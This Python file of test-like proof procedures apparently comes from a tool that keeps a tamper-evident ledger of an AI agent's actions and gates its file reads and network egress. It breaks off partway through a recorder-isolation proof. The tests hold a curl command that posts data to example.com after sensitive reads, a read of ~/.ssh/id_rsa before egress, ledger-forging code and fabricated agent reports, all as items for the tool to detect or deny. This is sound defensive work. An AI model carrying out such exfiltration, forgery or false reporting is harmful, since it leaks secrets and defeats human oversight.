"""Proof procedures for the claims whose milestones have landed.

Each exercises the real surface — a real ledger file on disk, the real vendored hooks, the real
CSA template — and returns what it observed. None of them asserts; they *report*, and the runner
records the report. A procedure that returns ``passed=False`` is a working procedure telling the
truth about a broken claim.

Claims whose milestones have not landed have no procedure. `stop-guessing claims check` reports
them as unproven, which at release time is a **failed** claim, not an unassessed one.
"""

from __future__ import annotations

import hashlib
import hmac
import json
import subprocess
import sys
import tempfile
from pathlib import Path

from stop_guessing.artifacts.digest import file_digest
from stop_guessing.caiq.workbook import inspect as caiq_inspect
from stop_guessing.ledger import segments
from stop_guessing.ledger.chain import ChainKey, append, canonical_material, verify
from stop_guessing.ledger.sink import LedgerError, load, record
from stop_guessing.prove.registry import ProofResult, proof
from stop_guessing.version import repo_root

PROOF_KEY = ChainKey("proof-procedure-key", b"procedure-local-key-32-bytes!!!!")
OTHER_KEY = ChainKey("wrong-key", b"a-different-key-32-bytes-long!!!")


def _caiq_template() -> Path:
    """The CSA blank template, resolved through the normal search path.

    Three procedures used to hardcode one developer's absolute path to it. That made the proofs
    that the AI-CAIQ is filled by the toolchain runnable on exactly one machine — while the whole
    point is that a CSA staffer can obtain the template from CSA and re-run them. `resolve_template`
    already handles --template, $STOP_GUESSING_CAIQ_TEMPLATE and the known locations, and reports
    its search path on failure, so there was never a reason to bypass it.
    """
    from stop_guessing.cli.cmd_caiq import resolve_template

    return Path(resolve_template(None))


def _event(i: int) -> dict:
    return {"op": "artifact.read", "actor": "agent/main", "detail": f"record {i}",
            "severity": "info", "at": f"2026-08-03T10:00:{i % 60:02d}.000Z"}


def _forge(entries: list[dict], keymat: bytes | None, upto: int) -> list[dict]:
    out = list(entries)
    for i in range(len(entries), upto):
        base = {"op": "artifact.read", "actor": "agent/main", "detail": f"FABRICATED {i}",
                "severity": "info", "at": "2026-08-03T10:00:00.000Z", "seq": i,
                "prev_hash": out[-1]["hash"], "hash_alg": entries[0]["hash_alg"],
                "keyid": entries[0].get("keyid")}
        mat = canonical_material(base)
        base["hash"] = (hmac.new(keymat, mat, hashlib.sha256).hexdigest() if keymat
                        else hashlib.sha256(mat).hexdigest())
        out.append(base)
    return out


# ── CLAIM-02 — keyed chain defeats truncate-and-recompute ────────────────────


@proof("CLAIM-02", "adversarial", "Forge a chain three ways against a real ledger on disk.")
def prove_keyed_chain_defeats_forgery() -> ProofResult:
    r = ProofResult(passed=True)
    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        p = Path(td) / "ledger.jsonl"
        for i in range(150):
            record(p, _event(i), PROOF_KEY)
        entries = load(p, PROOF_KEY).entries
        if not verify(entries, PROOF_KEY).intact:
            return r.fail("the honest 150-record ledger did not verify")
        r.observe(f"150 records written to a real file; chain verifies (keyed, {PROOF_KEY.keyid})")

        # (a) attacker with no key falls back to plain sha256
        va = verify(_forge(entries[:100], None, 150), PROOF_KEY)
        if va.intact or va.broken_at != 100:
            return r.fail(f"forgery with no key was not caught at 100: {va.to_dict()}")
        r.observe(f"forged with no key      -> caught at entry {va.broken_at}: {va.reason}")

        # (b) attacker substitutes a wrong key
        vb = verify(_forge(entries[:100], OTHER_KEY.material, 150), PROOF_KEY)
        if vb.intact or vb.broken_at != 100:
            return r.fail(f"forgery with a wrong key was not caught at 100: {vb.to_dict()}")
        r.observe(f"forged with wrong key   -> caught at entry {vb.broken_at}")

        # (c) control — with the real key the same forgery succeeds
        vc = verify(_forge(entries[:100], PROOF_KEY.material, 150), PROOF_KEY)
        if not vc.intact:
            return r.fail("control failed: forging WITH the real key should succeed")
        r.observe("control: forged WITH the real key -> intact, so the key is what stops (a)/(b)")

        # (d) the gap this closes — an unkeyed ledger accepts the same forgery
        u = Path(td) / "unkeyed.jsonl"
        for i in range(150):
            record(u, _event(i), None)
        ue = load(u, None).entries
        vd = verify(_forge(ue[:100], None, 150), None)
        if not vd.intact:
            return r.fail("the unkeyed control stopped controlling — re-derive this proof")
        r.observe("unkeyed ledger accepts 50 fabricated records as intact — the gap being closed")
        r.evidence = {"records": 150, "truncated_at": 100, "fabricated": 50,
                      "unkeyed_forgery_undetected": True}
    return r


# ── CLAIM-03 — refuses to append onto a broken or truncated chain ────────────


@proof("CLAIM-03", "negative", "Append onto a tampered and onto a torn ledger; both must refuse.")
def prove_sink_refuses_bad_chains() -> ProofResult:
    r = ProofResult(passed=True)
    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        p = Path(td) / "tampered.jsonl"
        log: list[dict] = []
        for i in range(10):
            log = append(log, _event(i), PROOF_KEY)
        log[4] = {**log[4], "detail": "TAMPERED"}
        p.write_text("".join(json.dumps(e, sort_keys=True, separators=(",", ":")) + "\n"
                             for e in log), encoding="utf-8")
        try:
            record(p, _event(99), PROOF_KEY)
            return r.fail("appended onto a tampered chain — the break would have been buried")
        except LedgerError as exc:
            if "bury the break" not in str(exc):
                return r.fail(f"refused, but not for the right reason: {exc}")
            r.observe("append onto a tampered chain -> REFUSED, citing entry 4")

        q = Path(td) / "torn.jsonl"
        for i in range(5):
            record(q, _event(i), PROOF_KEY)
        q.write_text(q.read_text()[:-40])
        loaded = load(q, PROOF_KEY)
        if not loaded.truncated:
            return r.fail("a torn final line was not detected")
        if len(loaded.entries) != 4 or not loaded.chain.intact:
            return r.fail("the intact prefix before the tear was not preserved")
        r.observe("torn final line detected; the 4-record intact prefix is still evidence")
        try:
            record(q, _event(99), PROOF_KEY)
            return r.fail("appended onto a torn ledger")
        except LedgerError as exc:
            if "partial" not in str(exc):
                return r.fail(f"refused, but not for the right reason: {exc}")
            r.observe("append onto a torn ledger -> REFUSED")
        r.evidence = {"tampered_at": 4, "intact_prefix": 4}
    return r


# ── CLAIM-04 — seal and archive, never truncate ──────────────────────────────


@proof("CLAIM-04", "live-run", "Seal a segment, chain the next to it, then modify the sealed one.")
def prove_segments_seal_and_chain() -> ProofResult:
    r = ProofResult(passed=True)
    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        s0, s1 = Path(td) / "seg0.jsonl", Path(td) / "seg1.jsonl"
        for i in range(30):
            record(s0, _event(i), PROOF_KEY)
        seal0 = segments.seal(s0, at="2026-08-03T11:00:00Z", key=PROOF_KEY, index=0)
        r.observe(f"sealed seg-000000: {seal0.records} records, head {seal0.head_hash[:16]}…")

        for i in range(10):
            record(s1, _event(i), PROOF_KEY)
        seal1 = segments.seal(s1, at="2026-08-03T11:01:00Z", key=PROOF_KEY,
                              prev_seal_digest=seal0.digest(), index=1)
        if seal1.prev_seal_digest != seal0.digest():
            return r.fail("segment 1 does not chain to segment 0's seal digest")
        r.observe(f"seg-000001 chains to seg-000000's seal digest {seal0.digest()[:16]}…")

        series = segments.verify_series([s0, s1], PROOF_KEY)
        if not series["ok"]:
            return r.fail(f"series verification failed: {series['findings']}")
        r.observe(f"series verifies: {series['segments']} segments, {series['records']} records")

        with open(s0, "a") as fh:
            fh.write('{"seq": 99}\n')
        after = segments.verify_sealed(s0, PROOF_KEY)
        if after["ok"]:
            return r.fail("a modified sealed segment still verified")
        r.observe(f"modifying the sealed segment -> caught: {after['findings'][0][:90]}")

        try:
            segments.seal(s0, at="t", key=PROOF_KEY, index=0)
            return r.fail("sealed a broken chain")
        except LedgerError:
            r.observe("re-sealing the broken segment -> REFUSED")
        r.evidence = {"segments": 2, "records": series["records"]}
    return r


# ── CLAIM-16 — supersession is byte-compatible ───────────────────────────────


@proof("CLAIM-16", "property", "Replay the whole corpus and diff against the recorded golden.")
def prove_compat_golden_holds() -> ProofResult:
    r = ProofResult(passed=True)
    res = subprocess.run(  # noqa: S603
        [sys.executable, "-m", "stop_guessing.cli.main", "compat", "verify"],
        capture_output=True, cwd=str(repo_root()), timeout=900,
    )
    out = res.stdout.decode() + res.stderr.decode()
    if res.returncode != 0:
        return r.fail(f"compat verify exited {res.returncode}: {out[-400:]}")
    r.observe(out.strip().splitlines()[-1])
    golden = json.loads((repo_root() / "fixtures" / "compat-golden.json").read_text())
    blocked = sum(1 for v in golden["outcomes"].values() if v["exit_code"] == 2)
    r.observe(f"golden: {golden['_cases']} cases, {golden['_invocations']} invocations, "
              f"{blocked} blocked")
    r.evidence = {"cases": golden["_cases"], "invocations": golden["_invocations"],
                  "blocked": blocked,
                  "golden_digest": file_digest(repo_root() / "fixtures" / "compat-golden.json")}
    return r


# ── CLAIM-14 — the AI-CAIQ version gate reads A1, not the sheet name ─────────


@proof("CLAIM-14", "negative", "Inspect the real template, then a copy whose A1 declares 1.0.2.")
def prove_caiq_version_gate() -> ProofResult:
    r = ProofResult(passed=True)
    pinned = json.loads(
        (repo_root() / "docs" / "ai-caiq" / "reference" / "TEMPLATE.json").read_text()
    )
    try:
        tpl = _caiq_template()  # resolved, never hardcoded — see the helper
    except FileNotFoundError as exc:
        return r.fail(str(exc))

    before = file_digest(tpl)
    before_mtime = tpl.stat().st_mtime_ns
    ins = caiq_inspect(tpl)
    if ins.findings:
        return r.fail(f"the real template did not match the pinned expectation: {ins.findings}")
    if ins.digest != pinned["sha256"]:
        return r.fail("the template digest no longer matches TEMPLATE.json — COPY-ONLY VIOLATION")
    r.observe(f"real template: A1 declares {ins.specification_version}/{ins.caiq_version}, "
              f"dimensions {ins.dimensions}, no findings")

    try:
        import openpyxl
    except ImportError:
        return r.fail("openpyxl unavailable")
    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        drift = Path(td) / "drift.xlsx"
        drift.write_bytes(tpl.read_bytes())
        wb = openpyxl.load_workbook(drift)
        wb["AI-CAIQv1.1.0"].cell(1, 1).value = json.dumps(
            {"specification_name": "AI Controls Matrix",
             "specification_version": "1.0.2", "caiq_version": "1.0.2"})
        wb.save(drift)
        d = caiq_inspect(drift)
        if d.ok:
            return r.fail("a drifted workbook passed the gate")
        if d.data_sheet != "AI-CAIQv1.1.0":
            return r.fail("the drift fixture did not keep the original sheet name, "
                          "so it does not demonstrate the point")
        r.observe("copy with sheet name STILL 'AI-CAIQv1.1.0' but A1 declaring 1.0.2 -> caught: "
                  + "; ".join(d.findings))

    if file_digest(tpl) != before or tpl.stat().st_mtime_ns != before_mtime:
        return r.fail("inspection modified the template — COPY-ONLY VIOLATION")
    r.observe(f"copy-only holds: template digest and mtime unchanged ({before[:16]}…)")
    r.evidence = {"template_sha256": before, "pinned_sha256": pinned["sha256"]}
    return r


# ── CLAIM-13 — fabricated execution claims are caught ────────────────────────


@proof("CLAIM-13", "adversarial", "Reconcile a dispatch ledger against fabricated agent reports.")
def prove_reconciliation_catches_fabrication() -> ProofResult:
    from stop_guessing.ledger.reconcile import Dispatch, Reported, issue_nonce, reconcile

    r = ProofResult(passed=True)
    led = [Dispatch(i, "agent/main", "run", issue_nonce("agent/main", i, PROOF_KEY))
           for i in range(3)]

    honest = [Reported(d.seq, d.actor, d.action, d.nonce) for d in led]
    if not reconcile(led, honest).verified:
        return r.fail("honest reports did not reconcile")
    r.observe("honest reports reconcile")

    cases = {
        "fabricated": ([*honest, Reported(9, "agent/main", "run", "made-up")],
                       "fabricated or replayed"),
        "replayed": ([*honest, honest[0]], "replayed"),
        "attribution": ([Reported(0, "agent/other", "run", led[0].nonce), *honest[1:]],
                        "attribution mismatch"),
        "nonce": ([Reported(0, "agent/main", "run", "wrong-nonce"), *honest[1:]],
                  "nonce mismatch"),
        "unreported": (honest[:2], "unreported execution"),
    }
    for name, (reports, expect) in cases.items():
        res = reconcile(led, reports)
        if res.verified or not any(expect in f for f in res.findings):
            return r.fail(f"{name}: expected {expect!r}, got {res.findings}")
        r.observe(f"{name:<12} -> caught: {next(f for f in res.findings if expect in f)[:80]}")
    r.evidence = {"attacks_caught": len(cases)}
    return r


# ── CLAIM-05 — a missing `alterations` key is refused; `[]` is accepted ──────


@proof("CLAIM-05", "negative", "Emit a record with alterations absent, then with it empty.")
def prove_absent_alterations_is_refused() -> ProofResult:
    from stop_guessing.ledger.entry import CustodyRecord, RecordInvalid, validate_tier_a

    r = ProofResult(passed=True)
    base = dict(
        op="artifact.read", agent_id="spiffe://local/test/agent/main",
        runtime_action_id="toolu_test", operator={"identity": "test", "uid": 501},
        session_id="s1", posture="steer", outcome="allow", channel="test",
        at="2026-08-03T10:00:00Z", recorded_at="2026-08-03T10:00:00Z", record_id="sg:test",
        input_digest="sha256:" + "0" * 64, policy_set_digest="sha256:x",
        determining_policy="10-base#allow",
    )

    ok = CustodyRecord(**base).build()
    if ok["predicate"]["alterations"] != []:
        return r.fail("an empty alterations list did not survive the build")
    r.observe("alterations: []  -> ACCEPTED (a positive assertion that nothing was altered)")

    pred = CustodyRecord(**base).predicate()
    del pred["alterations"]
    missing = validate_tier_a(pred)
    if not any("alterations" in m for m in missing):
        return r.fail("a record with alterations absent was not rejected")
    r.observe(f"alterations absent -> REJECTED: {next(m for m in missing if 'alterations' in m)}")

    pred2 = CustodyRecord(**base).predicate()
    del pred2["verification"]["known_gaps"]
    if not any("known_gaps" in m for m in validate_tier_a(pred2)):
        return r.fail("a record with known_gaps absent was not rejected")
    r.observe("verification.known_gaps absent -> REJECTED (same rule: [] asserts, absent hides)")

    try:
        CustodyRecord(**{**base, "op": "not.a.real.op"}).build()
        return r.fail("an op outside the controlled vocabulary was accepted")
    except RecordInvalid as exc:
        r.observe(f"op outside the vocabulary -> REJECTED: {exc.missing[0]}")

    try:
        CustodyRecord(**{**base, "outcome": "probably"}).build()
        return r.fail("an outcome outside the vocabulary was accepted")
    except RecordInvalid as exc:
        r.observe(f"outcome outside the vocabulary -> REJECTED: {exc.missing[0]}")

    r.evidence = {"tier_a_fields": len(validate_tier_a({}))}
    return r


# ── CLAIM-06 — sufficiency reports incomplete rather than overclaiming ──────


@proof("CLAIM-06", "negative", "Assess a deliberately gapped ledger and a fuller one.")
def prove_sufficiency_refuses_to_overclaim() -> ProofResult:
    from stop_guessing.ledger.entry import CustodyRecord
    from stop_guessing.verify.sufficiency import assess

    r = ProofResult(passed=True)

    empty = assess([])
    if empty["verdict"] != "incomplete":
        return r.fail("an empty ledger did not report incomplete")
    r.observe("empty ledger -> INCOMPLETE ('an empty ledger answers nothing')")

    thin = CustodyRecord(
        op="artifact.read", agent_id="spiffe://local/test/agent/main",
        runtime_action_id="toolu_test", operator={"identity": "t", "uid": 1},
        session_id="s1", posture="steer", outcome="allow", channel="test",
        at="t", recorded_at="t", record_id="sg:1", input_digest="sha256:x",
        policy_set_digest="sha256:y", determining_policy="p",
    ).build()
    gapped = assess([thin])
    if gapped["verdict"] != "incomplete":
        return r.fail("a Tier-A-valid but evidence-thin record was reported sufficient — "
                      "this is exactly the DEMM-Bench overclaim")
    blocked = {q: v["blocked_by"] for q, v in gapped["questions"].items() if not v["answerable"]}
    if not blocked:
        return r.fail("no question was reported as blocked")
    r.observe(f"Tier-A-valid but thin record -> INCOMPLETE, {len(blocked)}/"
              f"{gapped['questions_total']} questions unanswerable")
    for q, by in list(blocked.items())[:2]:
        r.observe(f"  '{q}' blocked by: {', '.join(by)}")

    full = CustodyRecord(
        op="artifact.read", agent_id="spiffe://local/test/agent/main",
        runtime_action_id="toolu_test", operator={"identity": "t", "uid": 1},
        session_id="s1", posture="steer", outcome="allow", channel="test",
        at="t", recorded_at="t", record_id="sg:2", input_digest="sha256:x",
        policy_set_digest="sha256:y", determining_policy="p",
        extra={
            "authority": {"capability": {"grant_id": "cap_1", "scope": ["read:project"]}},
            "decision": {"basis": {"taint_labels": [], "taint_depth": 0}},
            "resources": {"used": [{"artifact_id": "art_1", "digest": "sha256:z"}]},
            "lifecycle": {"prompt_id": "prm_1"},
        },
    ).build()
    rich = assess([full])
    if rich["verdict"] != "sufficient":
        return r.fail(f"a fully populated record was still incomplete: {rich['questions']}")
    r.observe(f"fully populated record -> SUFFICIENT, {rich['answerable']}/"
              f"{rich['questions_total']} questions answerable")
    r.observe("the gate distinguishes 'a ledger exists' from 'the ledger answers the question'")
    r.evidence = {"regimes": len(rich["regimes"]), "questions": rich["questions_total"]}
    return r


# ── M4 helpers ───────────────────────────────────────────────────────────────


def _policy_set():
    from stop_guessing.policy.engine import load
    return load(repo_root() / "policy" / "coc.policy.d")


def _artifact_ctx(path: str, first_touch: bool):
    from stop_guessing.artifacts.classify import classify_path
    c = classify_path(path)
    return {"id": f"art_{abs(hash(path)) % 10**8}", "labels": sorted(c.labels),
            "classified": c.classified, "first_touch": first_touch,
            "is_ledger": "stop-guessing" in path and "ledger" in path}, c


# ── CLAIM-08 — steer ASKS on first touch, it does not deny read #1 ───────────


@proof("CLAIM-08", "live-run", "Evaluate a first touch of a classified artifact under steer.")
def prove_steer_asks_on_first_touch() -> ProofResult:
    from stop_guessing.taint.state import SessionCustodyState

    r = ProofResult(passed=True)
    ps = _policy_set()
    state = SessionCustodyState("proof-session")
    path = "/Users/isme/work/CSA/roster.csv"
    art, c = _artifact_ctx(path, first_touch=True)
    if not c.classified:
        return r.fail(f"{path} did not classify as sensitive: {sorted(c.labels)}")
    r.observe(f"{path} -> {sorted(c.labels)} via {list(c.matched)}")

    ctx = state.context(posture="steer",
                        call={"is_egress": False, "is_write": False, "is_own_binary": False},
                        artifact=art)
    d = ps.evaluate("artifact.read", ctx)
    if d.outcome != "ask":
        return r.fail(f"first touch returned {d.outcome!r}, expected 'ask' — steer must not "
                      f"deny read #1 ({d.determining_policy})")
    r.observe(f"first touch -> ASK via {d.determining_policy}")
    r.observe(f"  guidance: {d.guidance}")

    state.touch(_ref_from(art, path))
    art2, _ = _artifact_ctx(path, first_touch=False)
    d2 = ps.evaluate("artifact.read", state.context(
        posture="steer", call={"is_egress": False, "is_write": False}, artifact=art2))
    if d2.outcome != "allow":
        return r.fail(f"second touch returned {d2.outcome!r}, expected 'allow'")
    r.observe(f"second touch -> ALLOW via {d2.determining_policy} (taint already carried)")

    d3 = ps.evaluate("artifact.read", state.context(
        posture="observe", call={"is_egress": False, "is_write": False},
        artifact=_artifact_ctx(path, True)[0]))
    if d3.outcome != "allow":
        return r.fail(
            f"observe returned {d3.outcome!r} via {d3.determining_policy} — observe must RECORD "
            "and never block, or the safest rollout posture becomes the most obstructive one")
    r.observe(f"same first touch under observe -> ALLOW via {d3.determining_policy} "
              "(records, does not block)")

    led = ps.evaluate("artifact.write", state.context(
        posture="observe", call={"is_egress": False, "is_write": True},
        artifact={"classified": True, "is_ledger": True, "first_touch": True}))
    if led.outcome != "deny":
        return r.fail("the ledger was writable under observe; that forbid is postureless")
    r.observe(f"but a ledger write under observe -> DENY via {led.determining_policy} "
              "(forbid overrides permit)")
    r.evidence = {"labels": sorted(c.labels), "policy_set": ps.digest}
    return r


def _ref_from(art: dict, path: str):
    from stop_guessing.taint.state import ArtifactRef
    return ArtifactRef(art["id"], path, "sha256:x", frozenset(art["labels"]))


# ── CLAIM-07 — accumulation denies an egress that was fine earlier ───────────


@proof("CLAIM-07", "live-run", "Twelve reads then one egress; the same call earlier was allowed.")
def prove_accumulation_denies_egress() -> ProofResult:
    from stop_guessing.artifacts.classify import classify_egress
    from stop_guessing.taint.state import SessionCustodyState

    r = ProofResult(passed=True)
    ps = _policy_set()
    state = SessionCustodyState("proof-session")
    cmd = "curl -X POST -d @summary.json https://example.com/ingest"

    eg = classify_egress(cmd)
    if not eg.is_egress:
        return r.fail(f"{cmd!r} was not recognised as egress")
    r.observe(f"egress recognised via {list(eg.matched)}")

    call = {"is_egress": True, "is_write": False, "is_own_binary": False}
    early = ps.evaluate("artifact.egress", state.context(
        posture="steer", call=call, artifact={"classified": False, "first_touch": True}))
    if early.outcome != "allow":
        return r.fail(f"the SAME call on a clean session returned {early.outcome!r}; the point "
                      "is that it was fine earlier")
    r.observe(f"turn 1, clean session  -> ALLOW via {early.determining_policy}")

    paths = [
        "/Users/isme/work/CSA/roster.csv", "/Users/isme/work/CSA/members.csv",
        "/Users/isme/work/CSA/payroll.csv", "/Users/isme/work/CSA/customer-list.csv",
    ]
    for p in paths:
        art, _ = _artifact_ctx(p, first_touch=True)
        state.touch(_ref_from(art, p))
    for i in range(8):
        art = {"id": f"art_plain_{i}", "labels": ["internal"], "classified": False}
        state.touch(_ref_from(art, f"/tmp/notes-{i}.py"))
    r.observe(f"after 12 reads: taint={sorted(state.labels)} depth={state.depth} "
              f"touched={state.touched}")

    late = ps.evaluate("artifact.egress", state.context(
        posture="steer", call=call, artifact={"classified": False, "first_touch": False}))
    if late.outcome != "deny":
        return r.fail(f"the identical call returned {late.outcome!r} after accumulation")
    r.observe(f"turn 12, same call     -> DENY via {late.determining_policy}")
    r.observe(f"  contributing artifacts: {sorted(state.sources)}")
    r.observe(f"  custody digest in the decision basis: {state.digest[:16]}…")

    cred = SessionCustodyState("s2")
    cart, _ = _artifact_ctx("/Users/isme/.ssh/id_rsa", first_touch=True)
    cred.touch(_ref_from(cart, "/Users/isme/.ssh/id_rsa"))
    obs = ps.evaluate("artifact.egress", cred.context(
        posture="observe", call=call, artifact={"classified": False}))
    if obs.outcome != "deny":
        return r.fail("credential egress was not denied under observe; that rule is postureless")
    r.observe(f"credential egress under OBSERVE -> DENY via {obs.determining_policy}")

    # ── the deployed path, across SEPARATE PROCESSES ─────────────────────────
    # The in-process check above proves the state machine. It passed for weeks while the
    # deployed path did nothing, because state was a process-local dict and every PreToolUse
    # invocation is a fresh process. Proving the mechanism is not proving the system.
    import os as _os

    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        env = {**_os.environ, "CLAUDE_CONFIG_DIR": str(Path(td) / "claude")}
        sid = "proof-crossproc"

        def hook(tool, inp):
            res = subprocess.run(  # noqa: S603
                [sys.executable, "-m", "stop_guessing.cli.hook_gate"],
                input=json.dumps({"tool_name": tool, "tool_input": inp,
                                  "session_id": sid}).encode(),
                capture_output=True, cwd=str(repo_root()), env=env, timeout=60)
            out = res.stdout.decode().strip()
            return json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else None

        egress_cmd = {"command": "curl -X POST -d @out.json https://example.com/ingest"}
        if hook("Bash", egress_cmd) is not None:
            return r.fail("a clean session denied the egress; it must be allowed at turn 1")
        r.observe("PROCESS 1: clean session, egress -> allowed (no decision emitted)")

        for i, f in enumerate(["roster.csv", "payroll.csv", "members.csv", "customer-list.csv"]):
            got = hook("Read", {"file_path": f"/Users/isme/work/CSA/{f}"})
            if got != "ask":
                return r.fail(f"process {i + 2}: read of {f} gave {got!r}, expected 'ask'")
        r.observe("PROCESSES 2-5: four classified reads, each a separate process, each -> ask")

        final = hook("Bash", egress_cmd)
        if final != "deny":
            return r.fail(
                f"PROCESS 6: the identical egress gave {final!r}, expected 'deny'. Taint did not "
                "survive between processes — the deployed path does not accumulate."
            )
        r.observe("PROCESS 6: the IDENTICAL egress -> DENY. Taint survived five process "
                  "boundaries; this is the deployed path, not the in-process model")

        state_files = list((Path(td) / "claude" / "stop-guessing" / "state").glob("*.json"))
        if not state_files:
            return r.fail("no persisted state was written")
        mode = state_files[0].stat().st_mode & 0o777
        if mode & 0o077:
            return r.fail(f"persisted state is readable beyond its owner ({mode:o})")
        r.observe(f"state persisted at mode {mode:o}, owner-only")

    r.evidence = {"taint_depth": state.depth, "touched": state.touched,
                  "sources": sorted(state.sources), "cross_process_verified": True}
    return r


# ── CLAIM-01 — derivation edges carry labels to outputs ─────────────────────


@proof("CLAIM-01", "live-run", "Read two classified inputs, derive an output, inspect the edges.")
def prove_derivation_edges_recorded() -> ProofResult:
    from stop_guessing.taint.state import ArtifactRef, SessionCustodyState

    r = ProofResult(passed=True)
    state = SessionCustodyState("proof-session")
    a, _ = _artifact_ctx("/Users/isme/work/CSA/roster.csv", True)
    b, _ = _artifact_ctx("/Users/isme/work/CSA/payroll.csv", True)
    in_a, in_b = _ref_from(a, "/x/roster.csv"), _ref_from(b, "/x/payroll.csv")
    state.touch(in_a)
    state.touch(in_b)
    r.observe(f"inputs: {sorted(in_a.labels)} and {sorted(in_b.labels)}")

    out = ArtifactRef("art_out", "/x/summary.json", "sha256:out", frozenset({"public"}))
    state.derive(out, [in_a, in_b], via="scripts/summarise.py")
    if "restricted" not in out.labels:
        return r.fail(f"the derived output did not inherit its inputs' labels: {sorted(out.labels)}")
    r.observe(f"output declared public -> carries {sorted(out.labels)} after derivation")

    if len(state.edges) != 2:
        return r.fail(f"expected 2 derivation edges, got {state.edges}")
    for tgt, src, via in state.edges:
        r.observe(f"edge: {tgt} <- {src} via {via}")
    r.observe("this is the data-flow edge no surveyed tool records; OTel GenAI has no "
              "provenance attribute at all")
    r.evidence = {"edges": len(state.edges), "output_labels": sorted(out.labels),
                  "graph_digest": state.graph_digest}
    return r


# ── CLAIM-11 — state rebuilt from the ledger alone reproduces the digest ────


@proof("CLAIM-11", "property", "Build state, replay it from ledger records, compare digests.")
def prove_state_rebuilds_from_the_ledger() -> ProofResult:
    from stop_guessing.taint.state import ArtifactRef, SessionCustodyState, rebuild

    r = ProofResult(passed=True)
    live = SessionCustodyState("s-rebuild")
    records = []
    refs = []
    for i, p in enumerate(["/Users/isme/work/CSA/roster.csv",
                           "/Users/isme/work/CSA/payroll.csv",
                           "/tmp/notes.py"]):
        art, _ = _artifact_ctx(p, True)
        ref = ArtifactRef(f"art_{i}", p, f"sha256:{i}", frozenset(art["labels"]))
        refs.append(ref)
        live.touch(ref)
        records.append({"predicate": {
            "lifecycle": {"session_id": "s-rebuild"},
            "action": {"op": "artifact.read"},
            "resources": {"used": [ref.to_dict()]}}})

    out = ArtifactRef("art_out", "/x/sum.json", "sha256:o", frozenset({"public"}))
    live.derive(out, refs[:2], via="scripts/s.py")
    records.append({"predicate": {
        "lifecycle": {"session_id": "s-rebuild"},
        "action": {"op": "artifact.derive"},
        "resources": {"used": [refs[0].to_dict(), refs[1].to_dict()],
                      "generated": [{"artifact_id": "art_out", "path": "/x/sum.json",
                                     "digest": "sha256:o", "labels": ["public"]}],
                      "derived_from": [{"generated": "art_out", "source": "art_0",
                                        "via": "scripts/s.py"}]}}})

    records.append({"predicate": {
        "lifecycle": {"session_id": "other-session"},
        "action": {"op": "artifact.read"},
        "resources": {"used": [{"artifact_id": "art_zzz", "path": "/other/secret.env",
                                "digest": "sha256:z", "labels": ["restricted", "credential"]}]}}})

    replayed = rebuild(records, "s-rebuild")
    if replayed.digest != live.digest:
        return r.fail(f"rebuild digest {replayed.digest[:16]}… != live {live.digest[:16]}…")
    r.observe(f"live and replayed digests match exactly: {live.digest[:24]}…")
    r.observe(f"  labels {sorted(live.labels)}, depth {live.depth}, "
              f"{len(live.edges)} derivation edge(s)")
    if "credential" in replayed.labels:
        return r.fail("another session's taint leaked into this one")
    r.observe("a record from a different session was present and correctly ignored")
    r.observe("state never consults the transcript — a compaction cannot rewrite what was touched")
    r.evidence = {"digest": live.digest, "records_replayed": len(records)}
    return r


# ── CLAIM-09 — a delegated script cannot touch live data untested ───────────


@proof("CLAIM-09", "negative", "Try to run a delegated script untested, failing, and then edited.")
def prove_delegation_requires_a_passing_test() -> ProofResult:
    from stop_guessing.delegate import DelegationRefused, run, run_test, scaffold

    r = ProofResult(passed=True)
    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        d = Path(td) / "scripts"
        deleg = scaffold(d, "count_rows", "Count rows without returning them.")
        r.observe(f"scaffolded {deleg.script.name} + {deleg.test.name}")

        try:
            run(deleg, ["/tmp/x.csv"])
            return r.fail("ran a script whose test had never been run")
        except DelegationRefused as exc:
            if "has not been run" not in str(exc):
                return r.fail(f"refused for the wrong reason: {exc}")
            r.observe("run before testing -> REFUSED")

        res = run_test(deleg)
        if res["passed"]:
            return r.fail("the stub template's test passed; it must fail while handle() is a stub")
        r.observe(f"stub test fails as designed (exit {res['exit_code']})")
        try:
            run(deleg, ["/tmp/x.csv"])
            return r.fail("ran a script whose test failed")
        except DelegationRefused as exc:
            if "failed" not in str(exc):
                return r.fail(f"refused for the wrong reason: {exc}")
            r.observe("run after a FAILING test -> REFUSED")

        deleg.script.write_text(
            "import sys\n\n\ndef handle(paths):\n    return f'{len(paths)} artifact(s)'\n\n\n"
            "if __name__ == '__main__':\n    print(handle(sys.argv[1:]))\n", encoding="utf-8")
        res = run_test(deleg)
        if not res["passed"]:
            return r.fail(f"the implemented script's test did not pass: {res}")
        r.observe("implemented, test passes")

        out = run(deleg, ["/tmp/a.csv", "/tmp/b.csv"])
        if out["exit_code"] != 0 or "2 artifact" not in out["output"]:
            return r.fail(f"the delegated run did not produce output: {out}")
        r.observe(f"delegated run -> {out['output'].strip()!r}")
        r.observe(f"  sandbox kind: {out['sandbox']['kind']} — {out['sandbox']['caveat']}")

        deleg.script.write_text(
            deleg.script.read_text() + "\n# edited after the test passed\n", encoding="utf-8")
        try:
            run(deleg, ["/tmp/a.csv"])
            return r.fail("ran a script edited after its test passed")
        except DelegationRefused as exc:
            if "changed after its test passed" not in str(exc):
                return r.fail(f"refused for the wrong reason: {exc}")
            r.observe("run after EDITING the script post-test -> REFUSED "
                      "(a green test on a since-edited script is evidence about a file that no "
                      "longer exists)")
        r.evidence = {"refusals": 3}
    return r


# ── CLAIM-12 — the recorder is not reachable by the agent it records ─────────


@proof("CLAIM-12", "adversarial", "Five substitution attacks against the recorder, live.")
def prove_recorder_isolation() -> ProofResult:
    import os
    import stat as statmod

    from stop_guessing.policy.engine import load as load_policies
    from stop_guessing.recorder.guard import build_manifest, self_check
    from stop_guessing.taint.state import SessionCustodyState

    r = ProofResult(passed=True)
    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        root = Path(td)
        binary = root / "stop-guessing"
        binary.write_text("#!/bin/sh\nexec true\n")
        binary.chmod(0o755)
        hook = root / "coc_gate.sh"
        hook.write_text("#!/bin/sh\nexit 0\n")
        manifest = build_manifest(binary, {"coc_gate.sh": hook})

        base = self_check(argv0=str(binary), manifest=manifest, root=root)
        if not base.ok:
